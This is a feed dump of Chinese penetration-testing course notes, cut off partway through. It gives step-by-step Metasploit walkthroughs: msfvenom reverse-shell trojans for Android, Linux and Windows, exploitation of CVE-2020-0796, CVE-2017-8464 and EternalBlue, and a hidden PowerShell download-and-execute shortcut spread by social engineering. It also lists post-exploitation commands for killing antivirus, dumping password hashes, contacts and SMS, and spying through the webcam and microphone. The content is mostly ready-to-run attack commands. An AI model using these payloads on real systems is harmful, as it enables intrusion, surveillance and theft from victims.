        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台安卓手机或者模拟器</li></ol><h1 id="二、木马生成"><a href="#二、木马生成" class="headerlink" title="二、木马生成"></a>二、木马生成</h1><ol><li>生成一个APK后门</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R&gt;k.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf![1643003592876](21 通过木马反弹shell（Android）.assets/1643003592876.png)</p></li><li><p>载入监控模块  msf中输入：  </p><p><code>use exploit/multi/handler</code></p></li><li><p>载入payload MSF终端中输入： </p><p><code>set payload android/meterpreter/reverse_tcp</code></p><p>![1643003612323](21 通过木马反弹shell（Android）.assets/1643003612323.png)</p></li><li><p>配置payload  MSF终端中输入：<code>show options</code></p></li><li><p>配置监控IP MSF中输入：<code>set lhost  192.168.70.3</code></p></li><li><p>配置监控端口  MSF中输入：<code>set lport 4567</code></p></li><li><p>执行监控  msf终端中输入： </p><p><code>run</code>![1643003633911](21 通过木马反弹shell（Android）.assets/1643003633911.png)</p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机</p></li><li><p>在靶机上执行木马</p></li><li><p>完成攻击利用</p><p>![1643003654523](21 通过木马反弹shell（Android）.assets/1643003654523.png)</p></li></ol><p>获取手机通讯录： <code>dump_contacts</code></p><p>获取短信记录：<code>dump_sms</code></p><p>控制实验手机发短信：<code>send_sms -d 15330252525 -t "hello"</code></p><p>获取实验手机GPS定位信息：<code>geolocate</code></p><p>获取实验手机Wi-Fi定位信息：<code>wlan_geolocate</code></p><p>控制实验手机录音：<code>record_mic -d  5</code></p><p>获取实验手机相机设备：<code>webcam_list</code></p><p>控制实验手机拍照 ：<code>webcam_snap</code></p><p><strong>直播实验手机摄像头</strong>：<code>webcam_stream</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/18-tong-guo-mu-ma-fan-dan-shell-linux/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/18-tong-guo-mu-ma-fan-dan-shell-linux/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台靶机</li></ol><h1 id="二、木马生成"><a href="#二、木马生成" class="headerlink" title="二、木马生成"></a>二、木马生成</h1><ol><li><p>生成一个Linux后门</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf &gt; shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1643108165465](18 通过木马反弹shell（Linux）.assets/1643108165465.png)</p></li></ol><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf</p><p>![1643108186343](18 通过木马反弹shell（Linux）.assets/1643108186343.png)</p></li><li><p>载入监控模块  msf中输入：  <code>use exploit/multi/handler</code></p></li><li><p>加载payload  msf终端中输入：</p><p><code>set payload linux/x64/meterpreter/reverse_tcp</code></p></li><li><p>配置payload  msf终端中输入：<code>show options</code></p><p>![1643108202630](18 通过木马反弹shell（Linux）.assets/1643108202630.png)</p></li><li><p>配置payload监控IP msf终端中输入： <code>set  lhost  192.168.70.3</code></p></li><li><p>配置payload监控端口  msf终端中输入：<code>set lport  4567</code> （注意这里要和木马配置时使用的端口相同&amp;如果使用内网穿透服务填写转发后的端口）</p></li><li><p>检查payload配置  msf终端中输入：<code>show options</code></p></li><li><p>执行监控  msf终端中输入： <code>run</code></p><p>![1643108218621](18 通过木马反弹shell（Linux）.assets/1643108218621.png)</p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机 </p><p>通过python创建一个简单web服务</p><p><code>python3 -m http.server 80</code></p><p>或</p><p> <code>python2 -m SimpleHTTPServer 80</code></p></li><li><p>在靶机上<strong>执行</strong>木马 </p></li><li><p>完成攻击利用</p><p>![1643108263211](18 通过木马反弹shell（Linux）.assets/1643108263211.png)</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/17-sheng-cheng-mu-ma-fan-dan-shell-windows/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/17-sheng-cheng-mu-ma-fan-dan-shell-windows/</url>
      
        <content type="html"><![CDATA[<p>生成木马反弹shell（Windows）</p><h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台windiows靶机</li></ol><h1 id="二、开始生成木马"><a href="#二、开始生成木马" class="headerlink" title="二、开始生成木马"></a>二、开始生成木马</h1><ol><li>使用msfvenom生成木马</li><li>终端内输入:</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x86/shikata_ga_nai -i 5 -f exe -o  shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf</p><p><img src="/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501758409.png" alt="1642501758409"></p></li><li><p>载入监控模块  msf中输入： <code>use exploit/multi/handler</code></p><p><img src="/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501831818.png" alt="1642501831818"></p></li><li><p>加载payload  msf终端中输入：<code>set payload windows/meterpreter/reverse_tcp</code></p></li><li><p>配置payload  msf终端中输入：<code>show options</code></p></li><li><p>配置payload监控IP msf终端中输入： <code>set  lhost 192.168.70.3</code></p></li><li><p>配置payload监控端口  msf终端中输入：<code>set lport  4567</code> （注意这里要和木马配置时使用的端口相同&amp;如果使用内网穿透服务填写转发后的端口）</p></li><li><p>检查payload配置  msf终端中输入：<code>show options</code> </p><p><img src="/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501934250.png" alt="1642501934250"></p></li><li><p>执行监控  msf终端中输入： <code>run</code></p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机</p></li><li><p>在靶机上执行木马</p></li><li><p>完成攻击利用</p><p><img src="/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501969373.png" alt="1642501969373"></p></li><li><p>查看进程：<code>ps</code></p></li><li><p>查看当前进程号：<code>getpid</code></p></li><li><p>查看<strong>系统信息</strong>：<code>sysinfo</code></p></li><li><p>查看目标机是否为虚拟机：</p></li><li><p><code>run post/windows/gather/checkvm</code></p></li><li><p>查看完整网络设置：<code>route</code></p></li><li><p>查看<strong>当前权限</strong>：<code>getuid</code></p></li><li><p><strong>自动提权</strong>：<code>getsystem</code></p></li><li><p>关闭杀毒软件：<code>run post/windows/manage/killav</code></p></li><li><p>启动远程桌面协议：<code>run post/windows/manage/enable_rdp</code></p></li><li><p>列举当前登录的用户：</p></li><li><p><code>run post/windows/gather/enum_logged_on_users</code></p></li><li><p>查看当前应用程序：</p></li><li><p><code>run post/windows/gather/enum_applications</code></p></li><li><p>抓取目标机的<strong>屏幕截图</strong>：<code>load espia</code> ； <code>screengrab</code></p></li><li><p>获取相机设备：<code>webcam_list</code></p></li><li><p>控制拍照 ：<code>webcam_snap</code></p></li><li><p><strong>直播摄像头</strong>：<code>webcam_stream</code></p></li><li><p><strong>观看屏幕</strong>：<code>run vnc</code></p></li><li><p>控制录音：<code>record_mic</code></p></li><li><p>查看<strong>当前目录</strong>：<code>pwd</code></p></li><li><p>查看当前目录：<code>getlwd</code></p></li><li><p>导出<strong>当前用户密码哈希</strong>  <code>run hashdump</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/16-cve-2020-0796-yong-heng-zhi-hei-lou-dong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/16-cve-2020-0796-yong-heng-zhi-hei-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-CVE-2020-0796-永恒之黑漏洞"><a href="#一、-CVE-2020-0796-永恒之黑漏洞" class="headerlink" title="一、 CVE-2020-0796 永恒之黑漏洞"></a>一、 CVE-2020-0796 永恒之黑漏洞</h1><p>永恒之黑漏洞与“永恒之蓝”漏洞极为相似，都是利用<strong>Windows SMB漏洞</strong>远程攻击获取系统最高权限。</p><p><strong>漏洞危害等级：高危</strong></p><p>“永恒之黑”漏洞高危之处在于对SMB客户端的攻击，攻击者可以通过构造一个“特制”的网页、压缩包、共享目录、OFFICE文档等，向攻击目标发送，一旦被攻击者打开则瞬间触发漏洞受到攻击。</p><p>漏洞成因：<br>CVE-2020-0796 漏洞存在于受影响版本的 Windows 驱动 <strong>srv2.sys</strong> 中，由于 Windows SMB 更新到 3.1.1 版本增加了<strong>对压缩数据</strong>的支持，未对用户传输的压缩数据的合法性进行校验。</p><p>受影响的Windows版本</p><p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)</p><h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p>1 一个受影响的windows版本</p><p>2  正常的电脑</p><h1 id="三、开始利用"><a href="#三、开始利用" class="headerlink" title="三、开始利用"></a>三、开始利用</h1><p>首先确认当前作为靶机的Windows系统是受影响的版本</p><p>Windows版本，按win+r，在弹出运行窗口中，输入 <code>winver</code></p><p>![1642062038435](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062038435.png)</p><h2 id="1、-漏洞发现"><a href="#1、-漏洞发现" class="headerlink" title="1、 漏洞发现"></a>1、 漏洞发现</h2><p>![1642062059301](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062059301.png)</p><p>使用奇安信的漏洞探测工具</p><p>直接在cmd中启动  CVE-2020-0796-Scanner.exe</p><p>根据提示输入扫描目标IP 或者扫描IP范围</p><p>![1642062077901](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062077901.png)</p><h2 id="2、准备蓝屏payload"><a href="#2、准备蓝屏payload" class="headerlink" title="2、准备蓝屏payload"></a>2、准备蓝屏payload</h2><p>![1642062098119](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062098119.png)</p><p>使用CVE-2020-0796 蓝屏工具进行攻击</p><p>python3 CVE-2020-0796.py <code>&lt;查询到存在漏洞的IP&gt;</code></p><p><code>python3 CVE-2020-0796.py  192.168.3.38</code></p><p>如果靶机没有蓝屏就重新攻击一下</p><p>![1642062112224](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062112224.png)</p><p>扩展阅读：</p><p>微软披露了一个最新的SMBv3(3.1.1)远程代码执行漏洞(CVE-2020-0796)，俗称“永恒之黑”。本漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，攻击方可直接远程攻击SMB服务端远程执行任意恶意代码，亦可通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端。永恒之黑一旦被成功利用，其危害不亚于永恒之蓝。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/15-cve-2017-8464/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/15-cve-2017-8464/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-什么是-CVE-2017-8464："><a href="#一、-什么是-CVE-2017-8464：" class="headerlink" title="一、 什么是 CVE-2017-8464："></a>一、 什么是 CVE-2017-8464：</h1><p>说明：</p><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在<strong>解析快捷方式</strong>时存在<strong>远程执行任意代码</strong>的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危</p><p>传播的载体一般是LNK ，<strong>LNK</strong>是windows系统内应用程序<strong>快捷方式</strong>文件的文件<strong>类型后缀名</strong>。</p><p>危害：</p><p>被攻击机插入存在攻击lnk的U盘后会反弹shell，哪怕是被隔离的内网，也可以在不上网的情况下被攻击。</p><h1 id="二、环境准备："><a href="#二、环境准备：" class="headerlink" title="二、环境准备："></a>二、环境准备：</h1><p>1 可复现的操作系统版本：</p><ul><li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li><li>Microsoft Windows 10 Version 1607 for x64-based Systems</li><li>Microsoft Windows 10 for 32-bit Systems</li><li>Microsoft Windows 10 for x64-based Systems</li><li>Microsoft Windows 10 version 1511 for 32-bit Systems</li><li>Microsoft Windows 10 version 1511 for x64-based Systems</li><li>Microsoft Windows 10 version 1703 for 32-bit Systems</li><li>Microsoft Windows 10 version 1703 for x64-based Systems</li><li>Microsoft Windows 7 for 32-bit Systems SP1</li><li>Microsoft Windows 7 for x64-based Systems SP1</li><li>Microsoft Windows 8.1 for 32-bit Systems</li><li>Microsoft Windows 8.1 for x64-based Systems</li><li>Microsoft Windows RT 8.1</li></ul><p>2 可复现的服务器系统版本：</p><ul><li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li><li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li><li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li><li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li><li>Microsoft Windows Server 2008 for x64-based Systems SP2</li><li>Microsoft Windows Server 2012</li><li>Microsoft Windows Server 2012 R2</li><li>Microsoft Windows Server 2016</li></ul><p>3 kali操作系统</p><h1 id="三、利用原理-："><a href="#三、利用原理-：" class="headerlink" title="三、利用原理 ："></a><strong>三、利用原理</strong> ：</h1><p>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒，并且被远控。</p><h1 id="四、实战利用"><a href="#四、实战利用" class="headerlink" title="四、实战利用"></a>四、实战利用</h1><p>启动MSF</p><p>终端内输入：<code>msfconsole</code></p><p>开始利用：</p><h4 id="1、使用MSF创建一个后门"><a href="#1、使用MSF创建一个后门" class="headerlink" title="1、使用MSF创建一个后门"></a>1、使用MSF创建一个后门</h4><p>msf内输入：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4456 -f psh-reflection&gt;/var/www/html/link.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2、在kali下开启apache2"><a href="#2、在kali下开启apache2" class="headerlink" title="2、在kali下开启apache2"></a>2、在kali下开启apache2</h4><p>终端内输入：<code>service apache2 start</code></p><h4 id="3、通过社会学进行快捷方式传播"><a href="#3、通过社会学进行快捷方式传播" class="headerlink" title="3、通过社会学进行快捷方式传播"></a>3、通过社会学进行快捷方式传播</h4><pre class="line-numbers language-none"><code class="language-none">powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.70.3/link.ps1');test.ps1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1641972171811](一、 什么是 CVE-2017-8464：.assets/1641972171811.png) </p><p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p><h4 id="4-回到MSF终端配置监听"><a href="#4-回到MSF终端配置监听" class="headerlink" title="4 回到MSF终端配置监听"></a>4 回到MSF终端配置监听</h4><p>msf内输入：  </p><p><code>use exploit/multi/handler</code></p><h4 id="5-配置payload"><a href="#5-配置payload" class="headerlink" title="5 配置payload"></a>5 配置payload</h4><p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p><p>![1641972198597](一、 什么是 CVE-2017-8464：.assets/1641972198597.png)</p><p>msf中输入 ： <code>show options</code>   配置payload</p><p>![1641972211876](一、 什么是 CVE-2017-8464：.assets/1641972211876.png)</p><p>设置 LHOST  和  LPORT</p><p>maf中输入：</p><p> <code>set lhost 192.168.70.3</code> 设置 LHOST</p><p><code>set lport 4456</code> 设置 LPORT</p><p>![1641972223277](一、 什么是 CVE-2017-8464：.assets/1641972223277.png)</p><p>最后在 输入 <code>show options</code> 查看配置是否生效</p><p>![1641972233527](一、 什么是 CVE-2017-8464：.assets/1641972233527.png)</p><h4 id="6、执行监听"><a href="#6、执行监听" class="headerlink" title="6、执行监听"></a>6、执行监听</h4><p>msf中输入 ： <code>run</code> 或者  <code>exploit</code></p><p>![1641972244295](一、 什么是 CVE-2017-8464：.assets/1641972244295.png)</p><p>进入靶机<strong>执行</strong>我们在靶机上创建的<strong>快捷方式</strong></p><p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p><p>稍等片刻获取到meterpreter</p><p>![1641972268406](一、 什么是 CVE-2017-8464：.assets/1641972268406.png)</p><h1 id="五、后渗透"><a href="#五、后渗透" class="headerlink" title="五、后渗透"></a>五、后渗透</h1><p>1、通过快捷方式执行程序</p><p>meterpreter中输入  shell</p><p>![1641972283719](一、 什么是 CVE-2017-8464：.assets/1641972283719.png)</p><p>发现shell显示有<strong>乱码</strong></p><p>linux和windows显示编码不一样。</p><p><strong>修改显示编码</strong>，shell内输入  <code>chcp 65001</code></p><p>![1641972295944](一、 什么是 CVE-2017-8464：.assets/1641972295944.png)</p><p>然后进入desktop目录（这个是win的桌面）</p><p>根据实际情况拼路径</p><p>shell 里输入：<code>cd c:/users/mb/desktop</code></p><p>查看当前目录文件：<code>dir</code></p><p>![1641972307789](一、 什么是 CVE-2017-8464：.assets/1641972307789.png)</p><p>2 更多操作</p><ol><li><p>查看进程：ps</p></li><li><p>查看当前进程号：getpid</p></li><li><p>查看系统信息：sysinfo</p></li><li><p>查看目标机是否为虚拟机：run post/windows/gather/checkvm</p></li><li><p>查看完整网络设置：route</p></li><li><p>查看当前权限：getuid</p></li><li><p>自动提权：getsystem</p></li><li><p>关闭杀毒软件：run post/windows/manage/killav</p></li><li><p>启动远程桌面协议：run post/windows/manage/enable_rdp</p></li><li><p>列举当前登录的用户：</p><p>run post/windows/gather/enum_logged_on_users</p></li><li><p>查看当前应用程序：run post/windows/gather/enum_applications</p></li><li><p>抓取目标机的屏幕截图：load espia ； screengrab</p></li><li><p>抓取摄像头的照片：webcam_snap</p></li><li><p>查看当前处于目标机的那个目录：pwd</p></li><li><p>查看当前目录：getlwd</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/14-yong-heng-zhi-lan-li-yong-wen-dang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/14-yong-heng-zhi-lan-li-yong-wen-dang/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-环境准备"><a href="#一、-环境准备" class="headerlink" title="一、 环境准备"></a><strong>一、 环境准备</strong></h1><p>1 一台Windows电脑</p><p>（可以使用虚拟机代替）</p><h3 id="2-Metasploit任意平台"><a href="#2-Metasploit任意平台" class="headerlink" title="2 Metasploit任意平台"></a>2 Metasploit任意平台</h3><p>  可以是Windows版，可以是kali自带版</p><h1 id="二、-CVE-2017-0144-介绍"><a href="#二、-CVE-2017-0144-介绍" class="headerlink" title="二、 CVE-2017-0144 介绍"></a><strong>二、</strong> CVE-2017-0144 介绍</h1><p>1.何为CVE-2017-0144？</p><p>​    CVE-2017-0144 既 永恒之蓝最早爆发于2017年4月14日晚，是一种利用<strong>Windows系统的SMB协议漏洞</strong>来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了勒索病毒，使全世界大范围内遭受了勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。</p><p>2.什么是SMB协议？</p><p> SMB是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间<strong>共享</strong>文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用<strong>TCP139</strong>端口和<strong>TCP445</strong>端口。</p><p>3.SMB工作原理是什么？</p><p>   （1）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</p><p>   （2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</p><p>   （3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</p><p>   （4）：连接到相应资源后，SMB客户端就能够通过open SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</p><h1 id="三、原理"><a href="#三、原理" class="headerlink" title="三、原理"></a><strong>三、原理</strong></h1><p>​永恒之蓝是在Windows的SMB服务处理<strong>SMB v1请求时发生的漏洞</strong>，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p><p>​通过永恒之蓝漏洞会<strong>扫描开放445文件共享端口的Windows机器</strong>，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><h1 id="四、CVE-2017-0144-利用方法"><a href="#四、CVE-2017-0144-利用方法" class="headerlink" title="四、CVE-2017-0144 利用方法"></a><strong>四、CVE-2017-0144 利用方法</strong></h1><p>1  启动Metasploit</p><p>终端里输入 <code>msfconsole</code></p><p>2 查询利用模块</p><p>终端里输入 <code>search ms17_010</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/960ae38818084260be8eb69e589edba4.png" alt="img"></p><p>3 使用<strong>探测</strong>模块</p><p>终端内输入  <code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>4 设置探测范围</p><p>终端内输入  <code>show options</code>   </p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/ab7ca3d4ba774677bc2a239c420349f7.png" alt="img"></p><p>上图中我们可以看到是需要配置一个RHOSTS  </p><p>终端内输入  <code>set rhosts  192.168.70.0/24</code>  </p><p>（设置扫描当前网段  可以通过 在终端内输入ip a 查看）</p><p>也可以设置范围 </p><p><code>set rhosts 192.168.70.1-192.168.70.20</code></p><p>5 开始探测</p><p>终端内输入  <code>run</code> 执行探测</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/7df1f73ea464404091de9c13d885c139.png" alt="img"></p><p>根据上图我们可以看到 192.168.70.13 这个IP的机器可能存在漏洞</p><p>6 开始漏洞利用</p><p>开始利用首先在终端里输入<br><code>search ms17_010</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8bf107d057a34676984a5d5e8b9bae73.png" alt="img"><br>使用 模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p>7 配置利用模块</p><p>配置模块<br><code>show options</code><br>配置靶机<br><code>set rhost 192.168.70.13</code>  这里IP填第五步探测到的IP</p><p>8 执行攻击</p><p>在终端里输入  <code>run</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8a0c81062f424c7682a329503a315313.png" alt="img"></p><p>知道咱们看到 win  则攻击成功 拿到meterpreter </p><p>9 后渗透操作</p><ol><li><p>查看进程：<code>ps</code></p></li><li><p>查看当前进程号：getpid</p></li><li><p>查看系统信息：<code>sysinfo</code></p></li><li><p>查看目标机是否为虚拟机：run post/windows/gather/checkvm</p></li><li><p>查看完整网络设置：route</p></li><li><p>查看当前权限：<code>getuid</code></p></li><li><p>自动提权：<code>getsystem</code></p></li><li><p>关闭杀毒软件：run post/windows/manage/killav</p></li><li><p>启动远程桌面协议：run post/windows/manage/enable_rdp</p></li><li><p>列举当前登录的用户：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p></li><li><p>查看当前应用程序：run post/windows/gather/enum_applications</p></li><li><p>抓取目标机的屏幕截图：<code>load espia</code> ； <code>screengrab</code></p></li><li><p>抓取摄像头的照片：webcam_snap</p></li><li><p>查看当前处于目标机的那个目录：<code>pwd</code></p></li><li><p>查看当前攻击机目录：getlwd</p></li><li><p>查看屏幕：<code>run vnc</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/13-php-hou-men-fan-dan-lian-jie-yan-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/13-php-hou-men-fan-dan-lian-jie-yan-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-环境准备"><a href="#一、-环境准备" class="headerlink" title="一、 环境准备"></a>一、 环境准备</h1><h3 id="1-DVWA靶场"><a href="#1-DVWA靶场" class="headerlink" title="1 DVWA靶场"></a>1 DVWA靶场</h3><p>   DVWA下载：<a href="https://codeload.github.com/ethicalhack3r/DVWA/zip/master">https://codeload.github.com/ethicalhack3r/DVWA/zip/master</a></p><p>注意：配置DVWA环境 准备PHP7.0以上，和 Nginx环境<br>1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist要通过重命名删掉）<br>2 使用浏览器访问 <a href="http://192.168.70.130:8080/setup.php">http://192.168.70.130:8080/setup.php</a><br>3 红字问题解决<br>4 缺少<strong>key</strong>  直接替换下面2句  或者 访问<a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a></p><pre class="line-numbers language-none"><code class="language-none">$_DVWA[ 'recaptcha_public_key' ] = '6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb';$_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5 allow_url_include: Disabled  提示没开启<br>找到php目录里的php.ini <strong>allow_url_include</strong>  将后面参数OFF 改成<strong>On</strong> 修改完成重启Nginx生效</p><h3 id="2-Metasploit任意平台"><a href="#2-Metasploit任意平台" class="headerlink" title="2 Metasploit任意平台"></a>2 Metasploit任意平台</h3><p>  可以是Windows版，可以是kali自带版</p><h1 id="二、Metasploit配置监控及攻击载荷"><a href="#二、Metasploit配置监控及攻击载荷" class="headerlink" title="二、Metasploit配置监控及攻击载荷"></a>二、Metasploit配置监控及攻击载荷</h1><h3 id="1-配置监控-使用handler模块"><a href="#1-配置监控-使用handler模块" class="headerlink" title="1 配置监控-使用handler模块"></a>1 配置监控-使用handler模块</h3><p><code>use exploit/multi/handler</code></p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png" alt="img" style="zoom:200%;"><h3 id="2-配置攻击载荷设置payload"><a href="#2-配置攻击载荷设置payload" class="headerlink" title="2 配置攻击载荷设置payload"></a>2 配置攻击载荷设置payload</h3><h4 id="第一步设置payload"><a href="#第一步设置payload" class="headerlink" title="第一步设置payload"></a>第一步设置payload</h4><p> <code>set payload php/meterpreter/reverse_tcp</code></p><h4 id="第二步设置-lhost-和-lport"><a href="#第二步设置-lhost-和-lport" class="headerlink" title="第二步设置 lhost 和 lport"></a>第二步设置 lhost 和 lport</h4><p> <code>set 